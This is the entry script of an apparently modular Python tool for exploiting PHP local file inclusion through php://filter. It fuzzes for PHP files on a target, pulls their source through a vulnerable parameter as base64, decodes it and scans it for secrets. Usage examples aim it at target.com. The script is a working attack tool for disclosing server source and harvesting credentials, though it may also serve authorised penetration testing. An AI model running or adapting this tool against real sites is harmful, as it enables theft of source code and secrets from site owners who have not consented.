#!/usr/bin/env python3
"""
PHP Filter LFI Source Code Disclosure Tool (Refactored)
Follows SOLID principles via modular components.
"""

import argparse
import sys
import base64
from typing import List, Optional

from php_filters.core.colors import Colors
from php_filters.core.models import ExtractResult
from php_filters.discovery.ffuf import FFufDiscovery
from php_filters.discovery.builtin import BuiltinDiscovery
from php_filters.extraction.extractor import Extractor
from php_filters.analysis.secret_scanner import SecretScanner
from php_filters.reporting.reporter import Reporter


def print_phase(title: str) -> None:
    print(f"{Colors.BLUE}{title}{Colors.NC}")
    print("=" * 60)


def discover_candidates(url: str, param: str, files: Optional[List[str]], wordlist: Optional[str], use_ffuf: bool) -> List[str]:
    if files:
        print_phase("[PHASE 1] Testing specific files")
        return files
    if wordlist:
        print_phase("[PHASE 1] Discovering PHP files")
        if use_ffuf:
            found = FFufDiscovery().discover(url, param, wordlist)
            if not found:
                print(f"{Colors.YELLOW}[*] Falling back to built-in discovery{Colors.NC}")
                return BuiltinDiscovery().discover(url, param, wordlist)
            return found
        return BuiltinDiscovery().discover(url, param, wordlist)
    print(f"{Colors.RED}[!] Must provide either --wordlist or --files{Colors.NC}")
    sys.exit(1)


def fetch_html_with_payload(extractor: Extractor, url: str, param: str, filename: str) -> Optional[str]:
    print(f"{Colors.YELLOW}[*] Extracting: {filename}{Colors.NC}")
    payload = extractor.build_payload(filename)
    html = extractor.fetch(url, param, payload)
    if not html:
        print(f"{Colors.RED}  [✗] Failed request{Colors.NC}")
    return html


def decode_base64_content(encoded: str) -> Optional[str]:
    try:
        decoded_bytes = base64.b64decode(encoded)
        try:
            return decoded_bytes.decode('utf-8')
        except UnicodeDecodeError:
            return decoded_bytes.decode('latin-1')
    except Exception as e:
        print(f"{Colors.RED}  [✗] Base64 decode error: {e}{Colors.NC}")
        return None


def is_php_source(source_code: str) -> bool:
    return ('<?php' in source_code) or ('<?=' in source_code)


def process_candidates(candidates: List[str], url: str, param: str, extractor: Extractor, scanner: SecretScanner, reporter: Reporter) -> None:
    print()
    print_phase("[PHASE 2] Extracting PHP source code")
    for filename in candidates:
        html = fetch_html_with_payload(extractor, url, param, filename)
        if not html:
            continue
        encoded = extractor.extract_base64(html)
        if not encoded:
            print(f"{Colors.RED}  [✗] No base64 content found{Colors.NC}")
            continue
        source_code = decode_base64_content(encoded)
        if not source_code:
            continue
        if not is_php_source(source_code):
            print(f"{Colors.RED}  [✗] Doesn't appear to be PHP code{Colors.NC}")
            continue
        secrets = scanner.scan(source_code, filename)
        result = ExtractResult(filename=filename, source_code=source_code, secrets=secrets)
        result.output_file = reporter.save_source(filename, source_code)
        reporter.add_result(result)


def orchestrate(url: str, param: str, output: str, files: List[str] = None, wordlist: str = None, use_ffuf: bool = True):
    reporter = Reporter(url, param, output)
    reporter.banner()
    extractor = Extractor()
    scanner = SecretScanner()

    candidates = discover_candidates(url, param, files, wordlist, use_ffuf)
    if not candidates:
        print(f"{Colors.RED}[!] No PHP files discovered{Colors.NC}")
        sys.exit(1)

    process_candidates(candidates, url, param, extractor, scanner, reporter)

    reporter.report()


def main():
    parser = argparse.ArgumentParser(
        description='PHP Filter LFI Source Code Disclosure Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic usage with ffuf
  %(prog)s -u "http://target.com/index.php?page=home" -p page -w php_files.txt

  # Use built-in fuzzing (no ffuf)
  %(prog)s -u "http://target.com/index.php?page=home" -p page -w php_files.txt --no-ffuf

  # Custom output directory
  %(prog)s -u "http://target.com/index.php?page=home" -p page -w php_files.txt -o results

  # Test specific files directly
  %(prog)s -u "http://target.com/index.php?page=home" -p page -f config,index,admin
        """
    )

    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-p', '--param', required=True, help='Vulnerable parameter name')
    parser.add_argument('-w', '--wordlist', help='Wordlist for PHP file discovery')
    parser.add_argument('-f', '--files', help='Comma-separated list of specific files to test')
    parser.add_argument('-o', '--output', default='php_sources', help='Output directory (default: php_sources)')
    parser.add_argument('--no-ffuf', action='store_true', help='Use built-in fuzzing instead of ffuf')

    args = parser.parse_args()

    files_list = [f.strip() for f in args.files.split(',')] if args.files else None
    orchestrate(
        url=args.url,
        param=args.param,
        output=args.output,
        files=files_list,
        wordlist=args.wordlist,
        use_ffuf=(not args.no_ffuf)
    )


if __name__ == '__main__':
    main()